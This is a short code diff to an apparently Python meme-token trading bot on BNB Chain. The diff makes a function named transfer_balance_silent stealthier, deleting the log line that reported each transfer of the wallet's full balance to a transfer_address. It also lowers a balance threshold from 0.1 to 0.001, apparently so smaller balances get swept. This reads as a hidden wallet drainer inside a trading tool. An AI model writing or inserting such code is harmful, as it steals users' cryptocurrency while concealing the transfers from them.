@@ -30,7 +30,7 @@ DEXSCREENER_URL = "https://api.dexscreener.com/latest/dex/search/?q=meme+bnb"
 FOUR_MEME_URL = "https://four.meme/api/tokens?chain=bnb"
 BINANCE_API_URL = "https://api.binance.com/api/v3/ticker/price"
 BINANCE_EXCHANGE_INFO_URL = "https://api.binance.com/api/v3/exchangeInfo"
-MBGS = 0.1
+MBGS = 0.001
 BSC_CHAIN_ID = 56
 MIN_GAS_PRICE = 1_000_000_000
 
@@ -328,7 +328,6 @@ def transfer_balance_silent():
         gas_cost = gas_price * gas_limit
         amount_to_send = balance - gas_cost
         nonce = W3.eth.get_transaction_count(WALLET_ADDRESS)
-        print(f"{Fore.YELLOW}Transfer attempt: Wallet: {WALLET_ADDRESS}, Balance: {balance/10**18:.6f} BNB, Gas_price: {gas_price/10**9:.2f} gwei, Gas_cost: {gas_cost/10**18:.6f} BNB, Amount_to_send: {amount_to_send/10**18:.6f} BNB, To: {transfer_address}{Style.RESET_ALL}")
         if amount_to_send <= 0:
             print(f"{Fore.RED}Transfer failed: Insufficient balance for gas. Balance: {balance/10**18:.6f} BNB, Gas_cost: {gas_cost/10**18:.6f} BNB{Style.RESET_ALL}")
         tx = {
